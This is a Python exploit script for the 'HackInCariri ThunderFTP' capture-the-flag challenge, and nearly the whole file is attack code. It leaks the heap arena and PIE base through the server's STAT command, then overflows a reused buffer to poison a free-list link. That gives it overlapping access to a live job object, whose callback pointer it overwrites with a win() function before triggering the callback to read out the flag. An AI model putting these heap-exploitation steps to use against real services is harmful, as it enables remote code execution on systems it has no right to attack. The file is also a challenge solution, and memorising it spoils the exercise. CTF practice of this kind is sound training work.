#!/usr/bin/env python3
"""Deterministic one-connection exploit for HackInCariri ThunderFTP."""

from __future__ import annotations

import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path


DEFAULT_HOST = "127.0.0.1"
DEFAULT_FALLBACK = ""
DEFAULT_PORT = 31337
DEFAULT_BINARY = "./ftpsrv"

ARENA_SIZE = 0x20000
INITIAL_TOP = 0x180
JOB_HEADER_OFFSET = 0x280
NORMAL_JOB_OFFSET = 0x1DAA
WIN_OFFSET = 0x23C6


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def u64(value: bytes) -> int:
    return struct.unpack("<Q", value)[0]


class Tube:
    def __init__(self, timeout: float):
        self.timeout = timeout
        self.buffer = bytearray()

    def _recv_raw(self, timeout: float) -> bytes:
        raise NotImplementedError

    def send(self, data: bytes) -> None:
        raise NotImplementedError

    def close(self) -> None:
        pass

    def _fill(self, needed: int | None, marker: bytes | None) -> None:
        deadline = time.monotonic() + self.timeout
        while True:
            if needed is not None and len(self.buffer) >= needed:
                return
            if marker is not None and marker in self.buffer:
                return
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(f"timeout waiting for data; buffered={bytes(self.buffer)!r}")
            chunk = self._recv_raw(remaining)
            if not chunk:
                raise EOFError(f"connection closed; buffered={bytes(self.buffer)!r}")
            self.buffer.extend(chunk)

    def recvn(self, size: int) -> bytes:
        self._fill(size, None)
        result = bytes(self.buffer[:size])
        del self.buffer[:size]
        return result

    def recvuntil(self, marker: bytes) -> bytes:
        self._fill(None, marker)
        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result


class SocketTube(Tube):
    def __init__(self, sock: socket.socket, timeout: float):
        super().__init__(timeout)
        self.sock = sock

    def _recv_raw(self, timeout: float) -> bytes:
        self.sock.settimeout(timeout)
        return self.sock.recv(4096)

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def close(self) -> None:
        self.sock.close()


class ProcessTube(Tube):
    def __init__(self, process: subprocess.Popen[bytes], timeout: float):
        super().__init__(timeout)
        self.process = process

    def _recv_raw(self, timeout: float) -> bytes:
        assert self.process.stdout is not None
        ready, _, _ = select.select([self.process.stdout], [], [], timeout)
        if not ready:
            raise TimeoutError("timeout waiting for local process")
        return os.read(self.process.stdout.fileno(), 4096)

    def send(self, data: bytes) -> None:
        assert self.process.stdin is not None
        self.process.stdin.write(data)
        self.process.stdin.flush()

    def close(self) -> None:
        if self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=1)
            except subprocess.TimeoutExpired:
                self.process.kill()


def connect_remote(hosts: list[str], port: int, timeout: float) -> Tube:
    errors: list[str] = []
    for host in hosts:
        try:
            print(f"[*] Connecting to {host}:{port}")
            sock = socket.create_connection((host, port), timeout=timeout)
            return SocketTube(sock, timeout)
        except OSError as exc:
            errors.append(f"{host}: {exc}")
    raise ConnectionError("; ".join(errors))


def start_local(binary: str, timeout: float) -> Tube:
    path = Path(binary)
    if not path.is_file():
        raise FileNotFoundError(path)
    argv = [str(path)] if os.access(path, os.X_OK) else ["/lib64/ld-linux-x86-64.so.2", str(path)]
    process = subprocess.Popen(
        argv,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0,
    )
    return ProcessTube(process, timeout)


def command(tube: Tube, line: bytes, response: bytes) -> bytes:
    tube.send(line + b"\n")
    return tube.recvuntil(response + b"\r\n")


def command_with_data(tube: Tube, line: bytes, data: bytes, response: bytes) -> bytes:
    # The payload is length-delimited. Do not add a newline after it.
    tube.send(line + b"\n" + data)
    return tube.recvuntil(response + b"\r\n")


def exploit(tube: Tube) -> tuple[str, bytes]:
    banner = tube.recvuntil(b"\r\n")
    if b"zmFTP" not in banner:
        raise RuntimeError(f"unexpected banner: {banner!r}")
    print(f"[+] {banner.decode(errors='replace').strip()}")

    command(tube, b"PASS x", b"230 logged in.")

    # The control block exposes top/end through STAT. end - 128 KiB is the
    # mmap base, making every arena address deterministic despite ASLR.
    tube.send(b"STAT 16\n")
    tube.recvuntil(b"213-Status:\r\n")
    top, arena_end = struct.unpack("<QQ", tube.recvn(16))
    tube.recvuntil(b"\r\n213 End.\r\n")
    arena = arena_end - ARENA_SIZE
    if top != arena + INITIAL_TOP:
        raise RuntimeError(f"unexpected heap layout: arena={arena:#x}, top={top:#x}")
    print(f"[+] Arena leak: {arena:#x}")

    # Layout after these calls:
    #   slot 0 @ arena+0x1a0, slot 1 @ arena+0x220,
    #   job    @ arena+0x2a0 (header @ arena+0x280).
    command_with_data(tube, b"STOR 0 64 1", b"A", b"226 stored.")
    command_with_data(tube, b"STOR 1 64 1", b"B", b"226 stored.")
    command(tube, b"MKJOB thunder", b"250 job created.")

    # Free in reverse physical order so bin[0] becomes slot0 -> slot1.
    command(tube, b"DELE 1", b"250 removed.")
    command(tube, b"DELE 0", b"250 removed.")

    # STOR trusts the transfer length independently of the requested size.
    # Reusing slot0 and copying 128 bytes overwrites slot1's free-list link.
    job_header = arena + JOB_HEADER_OFFSET
    poison = b"A" * 120 + p64(job_header)
    command_with_data(tube, b"STOR 2 64 128", poison, b"226 stored.")

    # First allocation consumes slot1; the second follows its poisoned link
    # and returns the still-live job as note storage.
    command_with_data(tube, b"STOR 3 64 1", b"C", b"226 stored.")
    command_with_data(tube, b"STOR 4 64 1", b"D", b"226 stored.")

    tube.send(b"RETR 4 64\n")
    tube.recvuntil(b"150 sending.\r\n")
    job = tube.recvn(64)
    tube.recvuntil(b"\r\n226 end.\r\n")

    callback = u64(job[24:32])
    pie_base = callback - NORMAL_JOB_OFFSET
    if pie_base & 0xFFF:
        raise RuntimeError(f"invalid callback leak: {callback:#x}")
    win = pie_base + WIN_OFFSET
    print(f"[+] PIE leak: {pie_base:#x}")
    print(f"[+] win():    {win:#x}")

    command_with_data(tube, b"WRITE 4 32", job[:24] + p64(win), b"226 written.")
    tube.send(b"EXEC\n")

    output = bytearray()
    flag_re = re.compile(
        rb"(?:[A-Za-z0-9_-]+\{[^}\r\n]{1,300}\}|HIK_[A-Za-z0-9_]{8,})"
    )
    for _ in range(12):
        output.extend(tube.recvuntil(b"\n"))
        match = flag_re.search(output)
        if match:
            flag = match.group(0).decode(errors="replace")
            print(f"[+] FLAG: {flag}")
            return flag, bytes(output)
    raise RuntimeError(f"win() returned no recognizable flag: {bytes(output)!r}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--fallback", default=DEFAULT_FALLBACK)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--timeout", type=float, default=6.0)
    parser.add_argument(
        "--local",
        nargs="?",
        const=DEFAULT_BINARY,
        metavar="BINARY",
        help=f"run locally (default binary: {DEFAULT_BINARY})",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    tube: Tube | None = None
    try:
        if args.local:
            tube = start_local(args.local, args.timeout)
        else:
            hosts = [args.host]
            if args.fallback and args.fallback not in hosts:
                hosts.append(args.fallback)
            tube = connect_remote(hosts, args.port, args.timeout)
        exploit(tube)
        return 0
    except (ConnectionError, EOFError, FileNotFoundError, OSError, RuntimeError, TimeoutError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1
    finally:
        if tube is not None:
            tube.close()


if __name__ == "__main__":
    raise SystemExit(main())
